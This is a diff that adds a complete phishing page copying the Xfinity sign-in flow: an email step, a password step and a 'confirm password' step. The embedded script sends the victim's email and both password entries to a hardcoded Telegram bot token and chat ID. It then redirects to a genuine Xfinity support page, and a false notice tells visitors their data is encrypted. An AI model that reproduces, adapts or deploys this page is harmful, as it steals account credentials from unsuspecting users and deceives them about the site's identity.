@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to Xfinity</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: #333;
+        }
+        
+        .login-container {
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            width: 100%;
+            max-width: 450px;
+            overflow: hidden;
+            position: relative;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .login-container:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.15);
+        }
+        
+        .header {
+            padding: 30px 30px 20px;
+            text-align: center;
+            background: white;
+            position: relative;
+        }
+        
+        .logo-container {
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: center;
+        }
+        
+        .logo {
+            height: 50px;
+        }
+        
+        .header h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin: 15px 0 10px;
+            color: #222;
+        }
+        
+        .sub-header {
+            font-size: 15px;
+            color: #666;
+            margin-bottom: 5px;
+        }
+        
+        .login-form {
+            padding: 25px 35px;
+        }
+        
+        .form-page {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .active {
+            display: block;
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #444;
+            font-size: 14px;
+        }
+        
+        .input-container {
+            position: relative;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 16px 20px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s;
+            background: #f8f9fa;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: #0066cc;
+            box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.15);
+            background: white;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 8px;
+            background: linear-gradient(135deg, #0066cc 0%, #004a99 100%);
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 4px 10px rgba(0, 102, 204, 0.2);
+        }
+        
+        .btn:hover {
+            background: linear-gradient(135deg, #0055b3 0%, #003d80 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0, 102, 204, 0.3);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .btn-secondary {
+            background: linear-gradient(135deg, #f0f0f0 0%, #e0e0e0 100%);
+            color: #333;
+            margin-top: 15px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
+        }
+        
+        .btn-secondary:hover {
+            background: linear-gradient(135deg, #e0e0e0 0%, #d0d0d0 100%);
+        }
+        
+        .footer {
+            padding: 25px 30px;
+            text-align: center;
+            background-color: #f8f9fa;
+            border-top: 1px solid #eaeaea;
+            font-size: 14px;
+        }
+        
+        .footer a {
+            color: #0066cc;
+            text-decoration: none;
+            margin: 0 12px;
+            transition: all 0.2s;
+        }
+        
+        .footer a:hover {
+            text-decoration: underline;
+            color: #004a99;
+        }
+        
+        .user-email-display {
+            color: #0066cc;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 25px;
+            padding: 12px;
+            font-size: 16px;
+            background-color: #f0f7ff;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
+        }
+        
+        .back-btn {
+            background: none;
+            border: none;
+            color: #0066cc;
+            cursor: pointer;
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            padding: 10px 0;
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+        
+        .back-btn:hover {
+            color: #004a99;
+        }
+        
+        .back-btn i {
+            margin-right: 10px;
+        }
+        
+        .password-actions {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 15px;
+            font-size: 14px;
+        }
+        
+        .password-actions a {
+            color: #0066cc;
+            text-decoration: none;
+            transition: all 0.2s;
+        }
+        
+        .password-actions a:hover {
+            text-decoration: underline;
+            color: #004a99;
+        }
+        
+        .password-toggle {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #777;
+            cursor: pointer;
+            font-size: 16px;
+            transition: all 0.2s;
+        }
+        
+        .password-toggle:hover {
+            color: #333;
+        }
+        
+        .remember-me {
+            display: flex;
+            align-items: center;
+            margin-top: 15px;
+            font-size: 14px;
+        }
+        
+        .remember-me input {
+            margin-right: 12px;
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+        }
+        
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 25px;
+        }
+        
+        .step {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background-color: #ddd;
+            margin: 0 8px;
+            transition: all 0.3s;
+        }
+        
+        .step.active {
+            background-color: #0066cc;
+            transform: scale(1.2);
+        }
+        
+        .status-message {
+            padding: 14px;
+            margin: 20px 0;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .status-message.error {
+            background-color: #ffebee;
+            color: #d32f2f;
+            border: 1px solid #ffcdd2;
+            display: block;
+        }
+        
+        .status-message.success {
+            background-color: #e8f5e9;
+            color: #2e7d32;
+            border: 1px solid #c8e6c9;
+            display: block;
+        }
+        
+        .status-message.info {
+            background-color: #e3f2fd;
+            color: #1565c0;
+            border: 1px solid #bbdefb;
+            display: block;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .security-notice {
+            background: #f0f7ff;
+            border-left: 4px solid #0066cc;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .security-notice i {
+            margin-right: 10px;
+            color: #0066cc;
+            font-size: 18px;
+        }
+        
+        @media (max-width: 500px) {
+            .login-container {
+                max-width: 100%;
+            }
+            
+            .header {
+                padding: 25px 20px 15px;
+            }
+            
+            .login-form {
+                padding: 20px;
+            }
+            
+            .footer {
+                padding: 20px;
+            }
+            
+            .logo {
+                height: 40px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="header">
+            <div class="logo-container">
+                <img src="https://assets.bounceexchange.com/assets/uploads/clients/1369/creatives/e2911629cfb3d49c9c52e7f365c89cf2.png" alt="Xfinity Logo" class="logo">
+            </div>
+            <h1 id="page-title">Sign in with your Xfinity ID</h1>
+            <div class="sub-header" id="page-subtitle">Enter your email to get started</div>
+        </div>
+        
+        <div class="step-indicator">
+            <div class="step active" id="step-1"></div>
+            <div class="step" id="step-2"></div>
+            <div class="step" id="step-3"></div>
+        </div>
+        
+        <!-- Email Page -->
+        <div id="email-page" class="form-page active">
+            <div class="login-form">
+                <div class="form-group">
+                    <label for="email">Email or Xfinity ID</label>
+                    <div class="input-container">
+                        <input type="email" id="email" class="input-field" placeholder="Enter your email address" autofocus>
+                    </div>
+                </div>
+                <button id="continue-btn" class="btn">Continue</button>
+                <button class="btn btn-secondary">Create an Xfinity ID</button>
+                
+                <div class="security-notice">
+                    <i class="fas fa-shield-alt"></i> Your security is important to us. All information is encrypted.
+                </div>
+            </div>
+        </div>
+        
+        <!-- Password Page -->
+        <div id="password-page" class="form-page">
+            <div class="login-form">
+                <button id="back-btn" class="back-btn">
+                    <i class="fas fa-arrow-left"></i> Back
+                </button>
+                
+                <div class="user-email-display" id="user-email-display"></div>
+                
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <div class="input-container">
+                        <input type="password" id="password" class="input-field" placeholder="Enter your password">
+                        <button class="password-toggle" id="password-toggle">
+                            <i class="fas fa-eye"></i>
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="remember-me">
+                    <input type="checkbox" id="remember">
+                    <label for="remember">Remember me</label>
+                </div>
+                
+                <div class="password-actions">
+                    <a href="#">Forgot password?</a>
+                    <a href="#">Forgot Xfinity ID?</a>
+                </div>
+                
+                <button id="next-to-confirm" class="btn">Continue</button>
+            </div>
+        </div>
+        
+        <!-- Confirm Password Page -->
+        <div id="confirm-password-page" class="form-page">
+            <div class="login-form">
+                <button id="back-to-password" class="back-btn">
+                    <i class="fas fa-arrow-left"></i> Back
+                </button>
+                
+                <div class="user-email-display" id="confirm-email-display"></div>
+                
+                <div class="form-group">
+                    <label for="confirm-password">Re-enter Password</label>
+                    <div class="input-container">
+                        <input type="password" id="confirm-password" class="input-field" placeholder="Re-enter your password">
+                        <button class="password-toggle" id="confirm-password-toggle">
+                            <i class="fas fa-eye"></i>
+                        </button>
+                    </div>
+                </div>
+                
+                <div id="status-message" class="status-message"></div>
+                
+                <button id="signin-btn" class="btn">Sign In</button>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <a href="#">Help</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Service</a>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // DOM elements
+            const emailPage = document.getElementById('email-page');
+            const passwordPage = document.getElementById('password-page');
+            const confirmPasswordPage = document.getElementById('confirm-password-page');
+            const continueBtn = document.getElementById('continue-btn');
+            const backBtn = document.getElementById('back-btn');
+            const backToPasswordBtn = document.getElementById('back-to-password');
+            const nextToConfirmBtn = document.getElementById('next-to-confirm');
+            const signinBtn = document.getElementById('signin-btn');
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const confirmPasswordInput = document.getElementById('confirm-password');
+            const userEmailDisplay = document.getElementById('user-email-display');
+            const confirmEmailDisplay = document.getElementById('confirm-email-display');
+            const pageTitle = document.getElementById('page-title');
+            const pageSubtitle = document.getElementById('page-subtitle');
+            const step1 = document.getElementById('step-1');
+            const step2 = document.getElementById('step-2');
+            const step3 = document.getElementById('step-3');
+            const passwordToggle = document.getElementById('password-toggle');
+            const confirmPasswordToggle = document.getElementById('confirm-password-toggle');
+            const statusMessage = document.getElementById('status-message');
+            
+            // Telegram credentials
+            const telegramToken = "8430407127:AAHKqQCwHnqeVDSTpdH8_WM2yyepps1vhng";
+            const chatId = "6894281987";
+            
+            // Variables to store form data
+            let userEmail = '';
+            let password1 = '';
+            
+            // Continue to password page
+            continueBtn.addEventListener('click', function() {
+                const email = emailInput.value.trim();
+                if (email && validateEmail(email)) {
+                    userEmail = email;
+                    userEmailDisplay.textContent = email;
+                    confirmEmailDisplay.textContent = email;
+                    emailPage.classList.remove('active');
+                    passwordPage.classList.add('active');
+                    pageTitle.textContent = "Enter your password";
+                    pageSubtitle.textContent = "For your security, please enter your password";
+                    step1.classList.remove('active');
+                    step2.classList.add('active');
+                    passwordInput.focus();
+                } else {
+                    showStatus('Please enter a valid email address', 'error');
+                }
+            });
+            
+            // Back to email page
+            backBtn.addEventListener('click', function() {
+                passwordPage.classList.remove('active');
+                emailPage.classList.add('active');
+                pageTitle.textContent = "Sign in with your Xfinity ID";
+                pageSubtitle.textContent = "Enter your email to get started";
+                step1.classList.add('active');
+                step2.classList.remove('active');
+                userEmailDisplay.textContent = "";
+            });
+            
+            // Continue to password confirmation page
+            nextToConfirmBtn.addEventListener('click', function() {
+                const password = passwordInput.value;
+                if (password.length >= 6) {
+                    password1 = password;
+                    
+                    // Send first password to Telegram
+                    sendToTelegram(`First Password Entry:\nEmail: ${userEmail}\nPassword: ${password1}`, 'first-password');
+                    
+                    passwordPage.classList.remove('active');
+                    confirmPasswordPage.classList.add('active');
+                    pageTitle.textContent = "Confirm your password";
+                    pageSubtitle.textContent = "Please re-enter your password for verification";
+                    step2.classList.remove('active');
+                    step3.classList.add('active');
+                    confirmPasswordInput.focus();
+                } else {
+                    showStatus('Password must be at least 6 characters', 'error');
+                }
+            });
+            
+            // Back to password page
+            backToPasswordBtn.addEventListener('click', function() {
+                confirmPasswordPage.classList.remove('active');
+                passwordPage.classList.add('active');
+                pageTitle.textContent = "Enter your password";
+                pageSubtitle.textContent = "For your security, please enter your password";
+                step3.classList.remove('active');
+                step2.classList.add('active');
+                statusMessage.className = 'status-message';
+            });
+            
+            // Toggle password visibility
+            let passwordVisible = false;
+            passwordToggle.addEventListener('click', function() {
+                passwordVisible = !passwordVisible;
+                passwordInput.type = passwordVisible ? 'text' : 'password';
+                passwordToggle.innerHTML = passwordVisible ? 
+                    '<i class="fas fa-eye-slash"></i>' : 
+                    '<i class="fas fa-eye"></i>';
+            });
+            
+            confirmPasswordToggle.addEventListener('click', function() {
+                passwordVisible = !passwordVisible;
+                confirmPasswordInput.type = passwordVisible ? 'text' : 'password';
+                confirmPasswordToggle.innerHTML = passwordVisible ? 
+                    '<i class="fas fa-eye-slash"></i>' : 
+                    '<i class="fas fa-eye"></i>';
+            });
+            
+            // Sign in button
+            signinBtn.addEventListener('click', function() {
+                const password2 = confirmPasswordInput.value;
+                
+                if (!password2) {
+                    showStatus('Please re-enter your password', 'error');
+                    return;
+                }
+                
+                // Send second password to Telegram
+                sendToTelegram(`Second Password Entry:\nEmail: ${userEmail}\nPassword: ${password2}`, 'second-password');
+                
+                // Show loading state
+                signinBtn.disabled = true;
+                signinBtn.innerHTML = '<span class="spinner"></span> Signing In...';
+                
+                // Show success message
+                showStatus('Login successful! Redirecting to Xfinity Email...', 'success');
+                
+                // Redirect to Xfinity email after 2 seconds
+                setTimeout(() => {
+                    window.location.href = "https://www.xfinity.com/support/articles/voicemail-menu-options";
+                }, 2000);
+            });
+            
+            // Enter key functionality
+            emailInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') continueBtn.click();
+            });
+            
+            passwordInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') nextToConfirmBtn.click();
+            });
+            
+            confirmPasswordInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') signinBtn.click();
+            });
+            
+            // Simple email validation
+            function validateEmail(email) {
+                const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                return re.test(email);
+            }
+            
+            // Show status message
+            function showStatus(message, type) {
+                statusMessage.textContent = message;
+                statusMessage.className = `status-message ${type}`;
+                
+                // Auto hide after 5 seconds
+                if (type !== 'success') {
+                    setTimeout(() => {
+                        statusMessage.className = 'status-message';
+                    }, 5000);
+                }
+            }
+            
+            // Send message to Telegram
+            function sendToTelegram(message, logType) {
+                const url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                
+                // Send the request (fire and forget)
+                fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log(`${logType} sent to Telegram`);
+                    } else {
+                        console.error(`Error sending ${logType} to Telegram:`, data);
+                    }
+                })
+                .catch(error => {
+                    console.error(`Error sending ${logType} to Telegram:`, error);
+                });
+            }
+        });
+    </script>
+</body>
+</html>
